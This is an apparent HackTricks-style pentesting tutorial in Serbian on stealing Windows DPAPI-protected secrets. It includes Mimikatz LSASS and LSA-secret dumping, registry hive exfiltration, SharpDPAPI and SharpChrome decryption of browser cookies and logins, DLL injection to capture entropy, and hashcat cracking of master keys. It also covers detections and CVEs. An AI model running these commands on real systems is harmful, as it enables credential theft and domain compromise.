# DPAPI - Izdvajanje lozinki

{{#include ../../banners/hacktricks-training.md}}



## Šta je DPAPI

Data Protection API (DPAPI) se prvenstveno koristi u Windows operativnom sistemu za **simetrično šifrovanje asimetričnih privatnih ključeva**, pri čemu se korisničke ili sistemske tajne koriste kao značajan izvor entropije. Ovaj pristup pojednostavljuje šifrovanje za developere tako što im omogućava da šifruju podatke pomoću ključa izvedenog iz korisničkih logon tajni ili, u slučaju sistemskog šifrovanja, sistemskih tajni za autentifikaciju domena, čime se eliminiše potreba da developeri sami upravljaju zaštitom ključa za šifrovanje.

Najčešći način korišćenja DPAPI-ja jeste putem funkcija **`CryptProtectData` i `CryptUnprotectData`**, koje aplikacijama omogućavaju da bezbedno šifruju i dešifruju podatke u okviru sesije trenutno prijavljenog procesa. To znači da podatke može dešifrovati samo isti korisnik ili sistem koji ih je šifrovao.

Pored toga, ove funkcije prihvataju i parametar **`entropy`**, koji će se takođe koristiti tokom šifrovanja i dešifrovanja. Zbog toga, da biste dešifrovali nešto što je šifrovano pomoću ovog parametra, morate navesti istu vrednost entropije koja je korišćena tokom šifrovanja.

### Generisanje korisničkog ključa

DPAPI generiše jedinstveni ključ (nazvan **`pre-key`**) za svakog korisnika na osnovu njegovih kredencijala. Ovaj ključ se izvodi iz korisničke lozinke i drugih faktora, a algoritam zavisi od tipa korisnika, ali se na kraju svodi na SHA1. Na primer, za korisnike domena, **zavisi od NTLM hash-a korisnika**.

Ovo je posebno interesantno zato što, ako napadač pribavi hash korisničke lozinke, može da:

- **Dešifruje sve podatke koji su šifrovani pomoću DPAPI-ja** koristeći ključ tog korisnika, bez potrebe za kontaktiranjem bilo kog API-ja
- Pokuša da **crack-uje lozinku** offline pokušavajući da generiše validan DPAPI ključ

Pored toga, svaki put kada korisnik šifruje neke podatke pomoću DPAPI-ja, generiše se novi **master key**. Ovaj master key se zapravo koristi za šifrovanje podataka. Svakom master key-u dodeljuje se **GUID** (Globally Unique Identifier) koji ga identifikuje.

Master keys se čuvaju u direktorijumu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gde je `{SID}` Security Identifier tog korisnika. Master key se čuva šifrovan pomoću korisničkog **`pre-key`**-a, kao i pomoću **domain backup key**-a radi oporavka (tako da se isti ključ čuva šifrovan 2 puta pomoću 2 različite lozinke).

Imajte na umu da se **domain key koji se koristi za šifrovanje master key-a nalazi na domain controller-ima i nikada se ne menja**, pa ako napadač ima pristup domain controller-u, može preuzeti domain backup key i dešifrovati master keys svih korisnika u domenu.<sup>[[2]](#references)</sup>

Šifrovani blob-ovi u svojim zaglavljima sadrže **GUID master key-a** koji je korišćen za šifrovanje podataka.

> [!TIP]
> DPAPI encrypted blob-ovi počinju sa **`01 00 00 00`**

Pronađite master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Ovako izgleda skup **Master Keys** jednog korisnika:

![Šta je DPAPI - generisanje korisničkih ključeva: Ovako izgleda skup Master Keys jednog korisnika](<../../images/image (1121).png>)

### Generisanje Machine/System ključa

Ovaj ključ se koristi za enkripciju podataka na računaru. Zasnovan je na **DPAPI_SYSTEM LSA secret-u**, posebnom ključu kojem može da pristupi samo SYSTEM korisnik. Ovaj ključ se koristi za enkripciju podataka kojima mora da bude omogućen pristup samom sistemu, kao što su credential-i na nivou računara ili secrets na nivou celog sistema.<sup>[[2]](#references)</sup>

Imajte na umu da ovi ključevi **nemaju domain backup**, pa su dostupni samo lokalno:

- **Mimikatz** može da mu pristupi dumpovanjem LSA secrets pomoću komande: `mimikatz lsadump::secrets`
- Secret je sačuvan u registry-ju, pa bi administrator mogao da **izmeni DACL permissions kako bi mu pristupio**. Registry path je: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Moguća je i offline ekstrakcija iz registry hive-ova. Na primer, kao administrator na targetu, sačuvajte hive-ove i eksfiltrirajte ih:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Zatim na vašem analysis box-u povratite DPAPI_SYSTEM LSA secret iz hive-ova i upotrebite ga za dešifrovanje blob-ova u opsegu mašine (lozinke zakazanih zadataka, akreditivi servisa, Wi‑Fi profili itd.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Podaci zaštićeni pomoću DPAPI-ja

Lični podaci koje DPAPI štiti obuhvataju:

- Windows creds
- Lozinke i podatke za automatsko dovršavanje iz Internet Explorera i Google Chrome-a
- Lozinke e-mail i internih FTP naloga za aplikacije kao što su Outlook i Windows Mail
- Lozinke za deljene foldere, resurse, bežične mreže i Windows Vault, uključujući ključeve za šifrovanje
- Lozinke za remote desktop konekcije, .NET Passport i privatne ključeve za različite namene šifrovanja i autentifikacije
- Mrežne lozinke kojima upravlja Credential Manager i lične podatke u aplikacijama koje koriste CryptProtectData, kao što su Skype, MSN messenger i druge
- Šifrovane blob-ove unutar registra
- ...

Podaci zaštićeni na nivou sistema uključuju:
- WiFi lozinke
- Lozinke scheduled task-ova
- ...

### Opcije za ekstrakciju master ključeva

- Ako korisnik ima domain admin privilegije, može da pristupi **domain backup key** ključu i dešifruje sve master ključeve korisnika u domenu:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Sa lokalnim administratorskim privilegijama moguće je **pristupiti memoriji LSASS procesa** i izdvojiti DPAPI master ključeve svih povezanih korisnika i SYSTEM ključ.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ako korisnik ima lokalne administratorske privilegije, može da pristupi **DPAPI_SYSTEM LSA secret** da bi dešifrovao master ključeve mašine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ako su lozinka ili NTLM hash korisnika poznati, možete **direktno dešifrovati master keys korisnika**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ako ste unutar session-a kao korisnik, moguće je zatražiti od DC-a **backup key za dešifrovanje master keys pomoću RPC-a**. Ako ste local admin, a korisnik je prijavljen, za ovo možete **ukrasti njegov session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Izlistavanje Vault-a
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pristup DPAPI šifrovanim podacima

### Pronalaženje DPAPI šifrovanih podataka

Uobičajene lokacije **zaštićenih datoteka** korisnika su:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Proverite i zamenu `\Roaming\` sa `\Local\` u gorenavedenim putanjama.

Primeri enumeracije:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) može da pronađe DPAPI šifrovane blobove u sistemu datoteka, registru i B64 blobovima:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Napomena da se [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (iz istog repozitorijuma) može koristiti za dešifrovanje osetljivih podataka poput cookies pomoću DPAPI-ja.

#### Brzi recepti za Chromium/Edge/Electron (SharpChrome)

- Trenutni korisnik, interaktivno dešifrovanje sačuvanih prijava/cookies (radi čak i sa Chrome 127+ app-bound cookies, jer se dodatni ključ razrešava iz korisnikovog Credential Manager-a prilikom izvršavanja u kontekstu korisnika):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline analiza kada imate samo fajlove. Prvo izdvojite AES state key iz profila „Local State“, a zatim ga upotrebite za dešifrovanje cookie DB-a:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage na nivou domena/remote kada imate DPAPI domain backup key (PVK) i admin na target hostu:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ako imate korisnikov DPAPI prekey/credkey (iz LSASS-a), možete preskočiti password cracking i direktno dešifrovati podatke profila:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Napomene
- Novije verzije Chrome/Edge mogu čuvati određene cookies koristeći "App-Bound" encryption. Offline decryption tih konkretnih cookies nije moguća bez dodatnog app-bound ključa; pokrenite SharpChrome u kontekstu ciljnog korisnika kako bi ga automatski preuzeo. Pogledajte Chrome security blog post naveden u nastavku.<sup>[[5]](#references)</sup>

### Pristupni ključevi i podaci

- **Koristite SharpDPAPI** da biste preuzeli kredencijale iz DPAPI encrypted fajlova u trenutnoj sesiji:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Preuzmite informacije o akreditivima** poput šifrovanih podataka i guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Dekripcija masterkey-a korisnika uz zahtev za **domain backup key** korišćenjem RPC-a:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Alat **SharpDPAPI** takođe podržava sledeće argumente za dešifrovanje masterkey-a (obratite pažnju na to da je moguće koristiti `/rpc` za preuzimanje backup key-a domena, `/password` za korišćenje password-a u plain text-u ili `/pvk` za navođenje DPAPI private key fajla domena...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dešifrovanje podataka pomoću masterkey-a**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Alat **SharpDPAPI** takođe podržava ove argumente za dešifrovanje `credentials|vaults|rdg|keepass|triage|blob|ps` (obratite pažnju na to da je moguće koristiti `/rpc` za preuzimanje backup ključa domena, `/password` za korišćenje lozinke u čistom tekstu, `/pvk` za navođenje datoteke privatnog ključa DPAPI domena, `/unprotect` za korišćenje sesije trenutnog korisnika...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Direktno korišćenje DPAPI prekey/credkey vrednosti (lozinka nije potrebna)

Ako možete da uradite dump LSASS-a, Mimikatz često otkriva DPAPI ključ specifičan za svaku prijavu, koji se može koristiti za dešifrovanje korisnikovih masterkeys bez poznavanja lozinke u plaintext obliku. Prosledite ovu vrednost direktno tooling-u:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Dešifrovanje nekih podataka korišćenjem **sesije trenutnog korisnika**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline dešifrovanje pomoću Impacket dpapi.py

Ako imate SID i lozinku korisnika žrtve (ili NT hash), možete u potpunosti offline dešifrovati DPAPI masterkeys i Credential Manager blobs pomoću Impacket-ovog dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifikujte artefakte na disku:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Odgovarajući masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ako je alat za prenos datoteka nepouzdan, kodirajte datoteke pomoću base64 na hostu i kopirajte izlaz:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Dekriptujte masterkey koristeći SID korisnika i password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Koristite dekriptovani masterkey za dešifrovanje credential blob-a:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Ovaj workflow često pronalazi domenske kredencijale koje aplikacije čuvaju koristeći Windows Credential Manager, uključujući administrativne naloge (npr. `*_adm`).

---

### Rukovanje opcionim entropy-jem („Third-party entropy“)

Neke aplikacije prosleđuju dodatnu vrednost **entropy** funkciji `CryptProtectData`. Bez ove vrednosti blob ne može da se dešifruje, čak i kada je poznat ispravan masterkey. Zbog toga je pribavljanje entropy-ja od suštinskog značaja pri ciljanju kredencijala zaštićenih na ovaj način (npr. Microsoft Outlook, neki VPN klijenti).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) je DLL u user-mode-u koji postavlja hooks na DPAPI funkcije unutar ciljnog procesa i transparentno beleži svaki prosleđeni opcioni entropy. Pokretanje EntropyCapture-a u režimu **DLL-injection** nad procesima kao što su `outlook.exe` ili `vpnclient.exe` generisaće datoteku koja mapira svaki entropy buffer na pozivajući proces i blob. Uhvaćeni entropy se kasnije može proslediti alatu **SharpDPAPI** (`/entropy:`) ili alatu **Mimikatz** (`/entropy:<file>`) kako bi se podaci dešifrovali.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Offline cracking masterkeys (Hashcat & DPAPISnoop)

Microsoft je uveo format masterkey-a **context 3** počevši od Windows 10 v1607 (2016). `hashcat` v6.2.6 (decembar 2023) dodao je hash-mode **22100** (DPAPI masterkey v1 context ), **22101** (context 1) i **22102** (context 3), čime je omogućeno cracking korisničkih lozinki direktno iz masterkey fajla uz GPU ubrzanje. Napadači stoga mogu da izvode word-list ili brute-force napade bez interakcije sa ciljnim sistemom.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) automatizuje proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Alat takođe može da parsira Credential i Vault blobs, da ih dešifruje pomoću razbijenih ključeva i izveze lozinke u čistom tekstu.<sup>[[8]](#references)</sup>


### Pristup podacima drugih mašina

U **SharpDPAPI** i **SharpChrome** možete navesti opciju **`/server:HOST`** da biste pristupili podacima udaljene mašine. Naravno, morate imati mogućnost pristupa toj mašini, a u sledećem primeru se pretpostavlja da je **domain backup encryption key poznat**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Drugi alati

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) je alat koji automatizuje ekstrakciju svih korisnika i računara iz LDAP direktorijuma, kao i ekstrakciju backup ključa domain controller-a putem RPC-a. Skripta zatim razrešava IP adresu svakog računara i izvršava smbclient na svim računarima kako bi preuzela sve DPAPI blobs svih korisnika i dešifrovala sve pomoću domain backup ključa.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Pomoću liste računara izvučene iz LDAP-a možete pronaći svaku podmrežu, čak i ako za nju niste znali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) može automatski da dump-uje secrets zaštićene pomoću DPAPI-ja. Izdanje 2.x je uvelo:<sup>[[9]](#references)</sup>

* Paralelno prikupljanje blobs sa stotina hostova
* Parsiranje **context 3** masterkeys i automatsku integraciju Hashcat cracking-a
* Podršku za Chrome "App-Bound" encrypted cookies (pogledajte sledeću sekciju)
* Novi režim **`--snapshot`** za ponovljeno proveravanje endpoint-a i poređenje novokreiranih blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) je C# parser za masterkey/credential/vault fajlove koji može da generiše Hashcat/JtR formate i opciono automatski pokrene cracking. U potpunosti podržava machine i user masterkey formate do Windows 11 24H1.<sup>[[8]](#references)</sup>


## Uobičajene detekcije

- Pristup fajlovima u `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i drugim direktorijumima povezanim sa DPAPI-jem.
- Naročito preko network share-a kao što su **C$** ili **ADMIN$**.
- Upotreba alata **Mimikatz**, **SharpDPAPI** ili sličnih alata za pristup LSASS memoriji ili dump-ovanje masterkeys.
- Event **4662**: *Operacija je izvršena nad objektom* – može se korelisati sa pristupom objektu **`BCKUPKEY`**.
- Event **4673/4674** kada proces zahteva *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Ranljivosti i promene ekosistema 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembar 2023). Napadač sa network pristupom mogao je da navede domain member-a da preuzme zlonamerni DPAPI backup ključ, čime bi se omogućilo dešifrovanje user masterkeys. Problem je zakrpljen kumulativnim update-om iz novembra 2023. – administratori treba da se uvere da su DC-ovi i workstations u potpunosti ažurirani.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (jul 2024) zamenio je prethodnu DPAPI-only zaštitu dodatnim ključem sačuvanim u okviru korisnikovog **Credential Manager-a**. Offline dešifrovanje cookies sada zahteva i DPAPI masterkey i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x mogu da povrate dodatni ključ kada se izvršavaju u user kontekstu.<sup>[[5]](#references)</sup>


### Studija slučaja: Zscaler Client Connector – Custom Entropy izveden iz SID-a

Zscaler Client Connector čuva nekoliko konfiguracionih fajlova u `C:\ProgramData\Zscaler` (npr. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Svaki fajl je enkriptovan pomoću **DPAPI-ja (Machine scope)**, ali vendor obezbeđuje **custom entropy** koja se *izračunava tokom runtime-a* umesto da se čuva na disku.<sup>[[1]](#references)</sup>

Entropy se ponovo formira iz dva elementa:

1. Tajna ugrađena u `ZSACredentialProvider.dll`.
2. **SID** Windows naloga kojem konfiguracija pripada.

Algoritam implementiran u DLL-u ekvivalentan je sledećem:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Pošto je tajna ugrađena u DLL koji se može pročitati sa diska, **bilo koji lokalni napadač sa SYSTEM pravima može ponovo generisati entropiju za bilo koji SID** i dešifrovati blobove offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Dešifrovanje daje kompletnu JSON konfiguraciju, uključujući svaki **device posture check** i njegovu očekivanu vrednost – informacije koje su veoma korisne pri pokušajima client-side bypass-a.

> SAVET: ostali šifrovani artefakti (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zaštićeni su pomoću DPAPI-ja **bez entropy-ja** (`16` nultih bajtova). Zbog toga se mogu direktno dešifrovati pomoću `ProtectedData.Unprotect` nakon dobijanja SYSTEM privilegija.

## Reference

- [1] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Security analysis and data recovery in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Reading DPAPI Encrypted Secrets with Mimikatz and C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Simple Extraction of DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
